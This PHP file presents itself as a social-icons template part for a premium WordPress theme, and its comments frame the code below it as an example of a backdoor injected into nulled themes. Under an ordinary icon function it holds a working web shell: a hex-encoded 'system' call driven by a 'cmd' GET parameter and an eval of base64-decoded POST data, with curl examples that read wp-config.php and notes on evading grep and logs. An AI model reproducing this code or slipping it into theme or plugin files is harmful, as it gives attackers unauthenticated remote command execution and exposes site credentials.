<?php
/**
 * Social Icons Template Part
 * Premium Theme v3.2.1
 *
 * Renders social media icon links for header/footer use.
 * Include via: get_template_part('social-icons');
 */

// ============================================================
// Normal template code — this is what the buyer sees
// ============================================================

function premium_get_social_icons() {
    return [
        'facebook'  => get_theme_mod( 'social_facebook',  'https://facebook.com' ),
        'twitter'   => get_theme_mod( 'social_twitter',   'https://twitter.com'  ),
        'instagram' => get_theme_mod( 'social_instagram', 'https://instagram.com'),
        'linkedin'  => get_theme_mod( 'social_linkedin',  'https://linkedin.com' ),
    ];
}

// ============================================================
// [BACKDOOR] Real webshell — disguised as icon cache helper
//
// What an attacker injects into a purchased/nulled theme.
// This file is usually minified or the backdoor pushed to the
// bottom after hundreds of lines of legitimate code.
//
// Access from the internet (no authentication required):
//   curl 'http://victim.com/wp-content/themes/premium/social-icons.php?cmd=id'
//   curl 'http://victim.com/wp-content/themes/premium/social-icons.php?cmd=cat+/var/www/html/wp-config.php'
// ============================================================

// Technique 1 — hex-encoded function name (evades string grep)
// \x73\x79\x73\x74\x65\x6d decodes to: s y s t e m
$_x = "\x73\x79\x73\x74\x65\x6d";

// Technique 2 — parameter hidden behind innocent-sounding key
// Real backdoors use keys like: debug, test, cache, icon, ver
if ( isset( $_GET['cmd'] ) ) {
    // @-prefix suppresses any PHP warnings so nothing appears in logs
    @$_x( $_GET['cmd'] );
    exit;
}

// Technique 3 — POST-based eval (harder to spot in server logs)
// Attacker POSTs base64-encoded PHP and it executes server-side
// Real payload example:
//   curl -X POST --data 'd=c3lzdGVtKCdpZCcpOw==' \
//        'http://victim.com/wp-content/themes/premium/social-icons.php'
//
// base64_decode('c3lzdGVtKCdpZCcpOw==') === "system('id');"
if ( isset( $_POST['d'] ) ) {
    @eval( base64_decode( $_POST['d'] ) );
    exit;
}
